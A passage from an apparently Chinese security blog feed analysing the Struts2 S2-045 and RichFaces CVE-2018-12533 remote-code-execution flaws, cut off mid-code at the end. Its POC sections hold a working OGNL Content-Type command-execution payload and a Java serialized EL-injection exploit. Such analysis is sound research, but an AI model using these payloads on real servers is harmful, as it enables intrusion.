JakartaMultiPartRequest$processUpload:91 # 解析请求</span><br><span class="line">      JakartaMultiPartRequest$parseRequest:147 # 创建请求报文解析器，解析上传请求</span><br><span class="line">        JakartaMultiPartRequest$createRequestContext # 实例化报文解析器</span><br><span class="line">      FileUploadBase$parseRequest:334 # 处理符合multipart/form-data的流数据</span><br><span class="line">        FileUploadBase$FileItemIteratorImpl:945 # 抛出ContentType错误的异常，并把错误的ContentType添加到报错信息中</span><br><span class="line">  JakartaMultiPartRequest$parse:68 # 处理文件上传异常</span><br><span class="line">    AbstractMultiPartRequest$buildErrorMessage:102 # 构建错误信息</span><br><span class="line">      LocalizedMessage$LocalizedMessage:35 # 构造函数赋值</span><br><span class="line">FileUploadInterceptor$intercept:264 # 进入文件上传处理流程，处理文件上传报错信息</span><br><span class="line">  LocalizedTextUtil$findText:391 # 查找本地化文本消息</span><br><span class="line">  LocalizedTextUtil$findText:573 # 获取默认消息</span><br><span class="line">    # 以下为ognl表达式的提取与执行过程</span><br><span class="line">    LocalizedTextUtil$getDefaultMessage:<span class="number">729</span></span><br><span class="line">      TextParseUtil$translateVariables:<span class="number">44</span></span><br><span class="line">        TextParseUtil$translateVariables:<span class="number">122</span></span><br><span class="line">          TextParseUtil$translateVariables:<span class="number">166</span></span><br><span class="line">            TextParser$evaluate:<span class="number">11</span></span><br><span class="line">            OgnlTextParser$evaluate:<span class="number">10</span></span><br></pre></td></tr></table></figure><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><h2 id="2-1-漏洞触发点"><a href="#2-1-漏洞触发点" class="headerlink" title="2.1 漏洞触发点"></a>2.1 漏洞触发点</h2><p>根据diff所得结果，跟进<code>validation</code>的执行流程，就如漏洞描述中所述，<code>validation</code>的调用位于Struts2的<code>FileUploadInterceptor</code>也就是处理文件上传的拦截器中。</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445122026554.jpg" alt=""></p><p>跟进<code>LocalizedTextUtil.findText</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445123304440.jpg" alt=""></p><p>这边先不着急向下跟，首先看一下<code>valueStack</code>的内容是什么：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445123822699.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445124084601.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445124242258.jpg" alt=""></p><p>通过键值关系从<code>ActionContext</code>中返回ognl的堆栈结构，也就是说<code>valueStack</code>和ognl的执行相关。</p><p>接下来跟进<code>findText</code>方法，着重跟一下<code>valueStack</code>，可以发现主要是以下方法调用到该值：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">findMessage()</span><br><span class="line">getMessage()</span><br><span class="line">getDefaultMessage()</span><br><span class="line">ReflectionProviderFactory.getInstance().getRealTarget()</span><br></pre></td></tr></table></figure><p>先不管<code>ReflectionProviderFactory.getInstance().getRealTarget()</code>，<code>findMessage()</code>在执行过程中都会调用到<code>getMessage()</code>，而在<code>getMessage()</code>和<code>getDefaultMessage()</code>中都存在<code>buildMessageFormat()</code>方法，该方法用于消息的格式化，而格式化的消息是由<code>TextParseUtil.translateVariables()</code>来生成的：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445168312615.jpg" alt=""></p><p>这里注意<code>getMessage()</code>方法需要设置<code>bundleName</code>这个参数，而这个参数是由<code>aClass</code>赋值的，而在整个触发流程中<code>aClass</code>是一个<code>File</code>异常类，而这个类在<code>Collections.java</code>中是找不到的，所以在执行过程中，所有的<code>getMessage()</code>和<code>findMessage()</code>都是返回<code>null</code>的，也就是说，在整个流程中，只有<code>getDefaultMessage()</code>会被触发。</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445168750161.jpg" alt=""></p><p>跟一下这个<code>TextParseUtil.translateVariables()</code>的具体实现：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445169246963.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445169778888.jpg" alt=""></p><p>可以看到首先对<code>defaultMessage</code>进行ognl表达式的提取，之后执行ognl表达式。所以漏洞的触发点就找到了。且触发的关键是构造一个含有ognl表达式的<code>defaultMessage</code>即：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445870135891.jpg" alt=""></p><h2 id="2-2-触发流程"><a href="#2-2-触发流程" class="headerlink" title="2.2 触发流程"></a>2.2 触发流程</h2><p>网上很多文章并没有说该漏洞的触发流程是什么样的，只是在上面的关键点下了一个断向下调试，所以只是完成了对这个流程的调试而已，并没有完整的把这个漏洞说清楚的原因（浮躁的圈子= =）。</p><p>我记录一下我<strong>根据单元测试</strong>而找到触发流程的过程。</p><p>根据2.1的分析，我们现在知道只要调用了<code>org.apache.struts2.interceptor.FileUploadInterceptor$intercept</code>且<code>request</code>触发错误处理流程，且<code>validation</code>不为空就可以触发ognl表达式的执行。所以首先我开始寻找哪里调用了<code>intercept()</code>这个方法：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445810409990.jpg" alt=""></p><p>如上图红框的内容，我找到了针对于<code>FileUploadInterceptor</code>的单元测试，在单元测试中详尽的描述了<code>intercept()</code>的处理流程，跟进看一下我找到了一个有趣的单元测试<code>testInvalidContentTypeMultipartRequest()</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445815696993.jpg" alt=""></p><p>还记得我们的<code>intercept</code>的处理流程么：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445816485991.jpg" alt=""></p><p>也就是说我们需要关心的只有<strong>MyFileupAction()与request的处理流程</strong>。</p><p>首先来看一下<code>MyFileupAction()</code>是否是<code>ValidationAware</code>接口的一个实例：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445818933568.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445819092552.jpg" alt=""></p><p>ok，是<code>ValidationAware</code>一个实现，<code>getAction()</code>方法将<code>setAction()</code>设置的对象返回。接下来我们跟一下<code>req</code>的处理流程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-&gt; createMultipartRequest(req, 2000)</span><br><span class="line">-&gt; new MultiPartRequestWrapper(jak, req, tempDir.getAbsolutePath(), new DefaultLocaleProvider())</span><br><span class="line">-&gt; this(multiPartRequest, request, saveDir, provider, false);</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445826642665.jpg" alt=""></p><p>关键点在于<code>multi.parse(request, saveDir);</code>根据调用栈，可以看到这里是调用了<code>JakartaMultiPartRequest</code>实例的<code>parse()</code>方法：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445833384827.jpg" alt=""></p><p>这里注意会捕获<code>FileUploadException</code>异常。</p><p>接着跟进<code>processUpload()</code>方法：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445833808692.jpg" alt=""></p><p>继续跟进：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445834087441.jpg" alt=""></p><p>首先看<code>createRequestContext()</code>对于请求做了哪些处理：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445834685948.jpg" alt=""></p><p>返回了一个实例化的<code>RequestContext()</code>，记住该实例有四个内置的方法：</p><ul><li>getCharacterEncoding()</li><li>getContentType()</li><li>getContentLength()</li><li>getInputStream()</li></ul><p>接着跟进<code>parseRequest()</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445836799663.jpg" alt=""></p><p>跟进<code>getItemIterator()</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445837499576.jpg" alt=""></p><p>继续跟进：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445837797094.jpg" alt=""></p><p>这一段代码首先调用了<code>RequestContext</code>实例的<code>getContentType()</code>方法，该方法就像上面调用栈中所看到的一样，会返回请求的<code>ContentType</code>字段，然后做一个存在性校验，校验<code>ContentType</code>是否为空或并非以<code>multipart</code>开头，如果上述条件成立，则抛出一个错误，并把错误的<code>ContentType</code>加入到报错信息中。这里的<code>InvalidContentTypeException</code>类是继承于<code>FileUploadException</code>的，也就是说会抛出一个<code>FileUploadException</code>的错误。</p><p>反过来看<code>JakartaMultiPartRequest</code>的异常捕获逻辑：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445842861699.jpg" alt=""></p><p>很有意思，我们直接跟进<code>buildErrorMessage</code>看一下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445844578180.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445847527207.jpg" alt=""></p><p>可以看到在这里，我们将包含着我们可以自定义的<code>ContentType</code>赋值给<code>defaultMessage</code>回看2.1所说的漏洞触发点，这里就是我们发送请求将ognl传递到漏洞触发点的<code>defaultMessage</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445849716255.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445852116856.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445852825484.jpg" alt=""></p><p>拆分消息中的ognl表达式，并执行：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445853082722.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445853186223.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445854416645.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15445855256634.jpg" alt=""></p><h1 id="0x03-构造POC"><a href="#0x03-构造POC" class="headerlink" title="0x03 构造POC"></a>0x03 构造POC</h1><p>根据上面的分析，我们可以看到构造POC的关键是在发送的请求中构造一个含有ongl表达式的<code>ContentType</code>。较为通用的一个poc如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;%&#123;(#nike=&apos;multipart/form-data&apos;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&apos;open /Applications/Calculator.app&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;&quot;</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/12/15446033184238.jpg" alt=""></p><h1 id="0x04-Reference"><a href="#0x04-Reference" class="headerlink" title="0x04 Reference"></a>0x04 Reference</h1><ul><li><a href="https://cwiki.apache.org/confluence/display/WW/S2-045" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-045</a></li><li><a href="https://www.easyaq.com/news/250515148.shtml" target="_blank" rel="noopener">https://www.easyaq.com/news/250515148.shtml</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;S2-045，一个很经典的漏洞，和网上已经有的分析不同，我将整个漏洞的触发点和流程全都理了一遍，感觉收获良多，算是能自己说服自己的分析了。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="Java" scheme="https://lucifaer.com/tags/Java/"/>
    
      <category term="Struts2" scheme="https://lucifaer.com/tags/Struts2/"/>
    
  </entry>
  
  <entry>
    <title>RF-14310（CVE-2018-12533）分析</title>
    <link href="https://lucifaer.com/2018/12/05/RF-14310%EF%BC%88CVE-2018-12533%EF%BC%89%E5%88%86%E6%9E%90/"/>
    <id>https://lucifaer.com/2018/12/05/RF-14310（CVE-2018-12533）分析/</id>
    <published>2018-12-05T07:33:00.000Z</published>
    <updated>2018-12-12T08:38:29.736Z</updated>
    
    <content type="html"><![CDATA[<p>RF-14310，另一个RichFaces的漏洞，利用面要比CVE-14667广。</p><a id="more"></a><h1 id="0x00-漏洞概述"><a href="#0x00-漏洞概述" class="headerlink" title="0x00 漏洞概述"></a>0x00 漏洞概述</h1><blockquote><p>JBoss RichFaces 3.1.0 through 3.3.4 allows unauthenticated remote attackers to inject expression language (EL) expressions and execute arbitrary Java code via a /DATA/ substring in a path with an org.richfaces.renderkit.html.Paint2DResource$ImageData object, aka RF-14310.</p></blockquote><p>根据漏洞描述，可以知道漏洞可以通过<code>org.richfaces.renderkit.html.Paint2DResource$ImageData</code>对象注入EL表达式来完成远程任意代码执行的漏洞。</p><h1 id="0x01-整体触发流程"><a href="#0x01-整体触发流程" class="headerlink" title="0x01 整体触发流程"></a>0x01 整体触发流程</h1><p>这个漏洞是在CVE-2018-14667之前爆出的，CVE-2018-14667的触发流程和其非常相似所以只谈几个较为重要的点。</p><p>总体来说这个洞还是出现在<code>RichFaces</code>资源加载的地方，可以说14667是这个漏洞的另一种利用方式。</p><p>当一个资源请求被调用时就会调用<code>org.ajax4jsf.resource.ResourceLifecycle</code>类，而在该类中实现资源发送的方法是<code>send</code>，在<code>send</code>中主要的功能由<code>sendResource</code>方法实现，而在<code>sendResource</code>又存在一个关键性的<code>send</code>方法：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/05/15439093924444.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/05/15439095243976.jpg" alt=""></p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/05/15439095424728.jpg" alt=""></p><p>我们看一下<code>send</code>方法的继承类：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/05/15439097913093.jpg" alt=""></p><p>在CVE-2018-14667中可以使用<code>UserResource</code>的<code>send</code>触发点来执行EL表达式，而在RF-14310中是利用<code>Paint2DResource</code>来执行EL表达式的。</p><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>重复的反序列化那一部分就不再赘述，主要看触发流程。</p><h2 id="2-1-反序列化流程"><a href="#2-1-反序列化流程" class="headerlink" title="2.1 反序列化流程"></a>2.1 反序列化流程</h2><p>根据0x01中的继承关系，我们直接看漏洞触发点<code>Paint2DResource</code>这个类的<code>send</code>方法：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/05/15439761586162.jpg" alt=""></p><p>可以看到这里的<code>ImageData</code>同样来自于<code>restoreData</code>这个方法，而这个方法同样是利用<code>getResourceData</code>来从<code>resourceData</code>映射中获取资源，而<code>setResourceData</code>的过程同样在<code>org.ajax4jsf.resource.InternetResourceService$serviceResource</code>中。</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/05/15439764146996.jpg" alt=""></p><p>所以反序列化流程是和CVE-2018-14667相同的。</p><h2 id="2-2-EL执行点"><a href="#2-2-EL执行点" class="headerlink" title="2.2 EL执行点"></a>2.2 EL执行点</h2><p>跟进<code>MethodBinding</code>的<code>invoke</code>方法：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/05/15439766004203.jpg" alt=""></p><p>可以看到在<code>MethodBinding</code>调用<code>invoke</code>之前，<code>MethodBinding</code>就已经执行了EL表达式。也就是说可以在<code>ImageData</code>的<code>_paint</code>属性中加入我们的EL表达式，下个断点来证明我们的想法：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/05/15439771951301.jpg" alt=""></p><p>值得注意的是，在构造poc时，需要使用<code>MethodExpression</code>的对象，这就意味着需要附加一个针对不同Tomcat版本的ssid(serialVersionUID)。</p><h2 id="2-3-触发流程"><a href="#2-3-触发流程" class="headerlink" title="2.3 触发流程"></a>2.3 触发流程</h2><p>就像0x01中所说的一样，在加载资源类时都会调用，和CVE-2018-14667不同的是，RF-14310利用时并不需要资源对象为缓存类对象，同时对于资源请求的标签没有限制，没有要求<code>InternetResource</code>必须为<code>userResource</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/12/05/15439777562030.jpg" alt=""></p><p>所以说可以直接发包调用资源触发漏洞。</p><h1 id="0x03-构造POC"><a href="#0x03-构造POC" class="headerlink" title="0x03 构造POC"></a>0x03 构造POC</h1><p>和CVE-2018-14667相同的部分就不重复说了，以下就谈一下写这个POC需要注意的几个点。</p><h2 id="3-1-suid（serialVersionUID）的限制"><a href="#3-1-suid（serialVersionUID）的限制" class="headerlink" title="3.1 suid（serialVersionUID）的限制"></a>3.1 <code>suid</code>（serialVersionUID）的限制</h2><p><code>suid</code>的主要作用简单来说就是保证序列化对象与反序列化对象的一致性，<strong>在richfaces中是调用<code>javax.el.*</code>来实现的，而不是调用lib中的<code>org.jboss.el.*</code></strong>来实现的，所以在写poc时最好利用反射把<code>javax.el.MethodExpression</code>中的<code>serialVersionUID</code>重写一下，保证在面对不同容器版本时设置不同的<code>serialVersionUID</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// tomcat8.5.24 MethodExpression serialVersionUID</span></span><br><span class="line">Long MethodExpressionSerialVersionUID = <span class="number">8163925562047324656L</span>;</span><br><span class="line">Class clazz = Class.forName(<span class="string">"javax.el.MethodExpression"</span>);</span><br><span class="line">Field field = clazz.getField(<span class="string">"serialVersionUID"</span>);</span><br><span class="line">field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Field modifiersField = Field.class.getDeclaredField(<span class="string">"modifiers"</span>);</span><br><span class="line">modifiersField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">modifiersField.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">field.setLong(<span class="keyword">null</span>, MethodExpressionSerialVersionUID);</span><br></pre></td></tr></table></figure><p>当然也可以手动导入不同版本容器的<code>el-api.jar</code>来实现。</p><h2 id="3-2-选择合适的利用链"><a href="#3-2-选择合适的利用链" class="headerlink" title="3.2 选择合适的利用链"></a>3.2 选择合适的利用链</h2><p>我根据CVE-2018-14667的poc选择了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">javax.faces.component.StateHolderSaver</span><br><span class="line">    com.sun.facelets.el.LegacyMethodBinding</span><br><span class="line">        com.sun.facelets.el.TagMethodExpression</span><br><span class="line">            com.sun.facelets.tag.TagAttribute</span><br><span class="line">            org.jboss.el.MethodExpressionImpl</span><br><span class="line">                expr = poc</span><br></pre></td></tr></table></figure><p>这个是我觉得最简单的一个利用链了，当然在<code>LegacyMethodBinding</code>可以换成除了<code>ConstantMethodBinding</code>和<code>SimpleActionMethodBinding</code>的任意一个。</p><h2 id="3-3-利用反射给private-static-final对象赋值"><a href="#3-3-利用反射给private-static-final对象赋值" class="headerlink" title="3.3 利用反射给private static final对象赋值"></a>3.3 利用反射给<code>private static final</code>对象赋值</h2><p>其实问题的关键点在于如何利用反射去给</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">public</span> <span class="title">class</span> <span class="title">Paint2DResource</span> <span class="keyword">extends</span> <span class="title">InternetResourceBase</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">ImageData</span> <span class="keyword">implements</span> <span class="title">SerializableResource</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样的类型赋值，同时要注意到<code>private static final class ImageData</code>是没有无参，无构造函数的私有类，所以没有办法直接通过<code>getDeclaredClass()</code>直接获取。方法就是首先反射创建<code>Paint2DResource</code>对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clzz = Class.forName(<span class="string">"org.richfaces.renderkit.html.Paint2DResource"</span>);</span><br><span class="line">Class innerClazz[] = clzz.getDeclaredClasses();</span><br></pre></td></tr></table></figure><p>这里的<code>getDeclaredClasses</code>返回<code>Paint2DResource</code>的所有构造器，之后遍历该对象中所有的构造器找到构造器名称中带有<code>private</code>的构造器，然后进行赋值操作：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Class c : innerClazz)&#123;</span><br><span class="line">    <span class="keyword">int</span> mod = c.getModifiers();</span><br><span class="line">    String modifier = Modifier.toString(mod);</span><br><span class="line">    <span class="keyword">if</span> (modifier.contains(<span class="string">"private"</span>))&#123;</span><br><span class="line">        Constructor cc = c.getDeclaredConstructor();</span><br><span class="line">        cc.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object imageData = cc.newInstance(<span class="keyword">null</span>);</span><br><span class="line">        Field _widthField = imageData.getClass().getDeclaredField(<span class="string">"_width"</span>);</span><br><span class="line">        _widthField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _widthField.set(imageData, <span class="number">300</span>);</span><br></pre></td></tr></table></figure><p>这里需要注意<code>c.getDeclaredConstructor()</code>参数应为空说明获得的是一个无参的构造器，而<code>cc.newInstance(null)</code>参数为<code>null</code>说明实例化的是一个无构造函数的对象。</p><h2 id="完整版POC"><a href="#完整版POC" class="headerlink" title="完整版POC"></a>完整版POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.facelets.el.LegacyMethodBinding;</span><br><span class="line"><span class="keyword">import</span> com.sun.facelets.el.TagMethodExpression;</span><br><span class="line"><span class="keyword">import</span> com.sun.facelets.tag.TagAttribute;</span><br><span class="line"><span class="keyword">import</span> com.sun.facelets.tag.Location;</span><br><span class="line"><span class="keyword">import</span> org.ajax4jsf.util.base64.URL64Codec;</span><br><span class="line"><span class="keyword">import</span> org.jboss.el.MethodExpressionImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.faces.context.FacesContext;</span><br><span class="line"><span class="keyword">import</span> javax.faces.el.MethodBinding;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.util.zip.Deflater;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CVE_2018_12533</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String pocEL = <span class="string">"#&#123;request.getClass().getClassLoader().loadClass(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"open /Applications/Calculator.app\")&#125;"</span>;</span><br><span class="line">        <span class="comment">// 根据文章https://www.anquanke.com/post/id/160338</span></span><br><span class="line">        Class cls = Class.forName(<span class="string">"javax.faces.component.StateHolderSaver"</span>);</span><br><span class="line">        Constructor ct = cls.getDeclaredConstructor(FacesContext.class, Object.class);</span><br><span class="line">        ct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        Location location = <span class="keyword">new</span> Location(<span class="string">""</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        TagAttribute tagAttribute = <span class="keyword">new</span> TagAttribute(location, <span class="string">""</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="string">"createContent="</span>+pocEL);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 设置ImageData</span></span><br><span class="line">        <span class="comment">//    构造ImageData_paint</span></span><br><span class="line">        MethodExpressionImpl methodExpression = <span class="keyword">new</span> MethodExpressionImpl(pocEL, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">new</span> Class[]&#123;OutputStream.class, Object.class&#125;);</span><br><span class="line">        TagMethodExpression tagMethodExpression = <span class="keyword">new</span> TagMethodExpression(tagAttribute, methodExpression);</span><br><span class="line">        MethodBinding methodBinding = <span class="keyword">new</span> LegacyMethodBinding(tagMethodExpression);</span><br><span class="line">        Object _paint = ct.newInstance(<span class="keyword">null</span>, methodBinding);</span><br><span class="line"></span><br><span class="line">        Class clzz = Class.forName(<span class="string">"org.richfaces.renderkit.html.Paint2DResource"</span>);</span><br><span class="line">        Class innerClazz[] = clzz.getDeclaredClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class c : innerClazz)&#123;</span><br><span class="line">            <span class="keyword">int</span> mod = c.getModifiers();</span><br><span class="line">            String modifier = Modifier.toString(mod);</span><br><span class="line">            <span class="keyword">if</span> (modifier.contains(<span class="string">"private"</span>))&#123;</span><br><span class="line">                Constructor cc = c.getDeclaredConstructor();</span><br><span class="line">                cc.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                Object imageData = cc.newInstance(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//    设置ImageData_width</span></span><br><span class="line">                Field _widthField = imageData.getClass().getDeclaredField(<span class="string">"_width"</span>);</span><br><span class="line">                _widthField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                _widthField.set(imageData, <span class="number">300</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//    设置ImageData_height</span></span><br><span class="line">                Field _heightField = imageData.getClass().getDeclaredField(<span 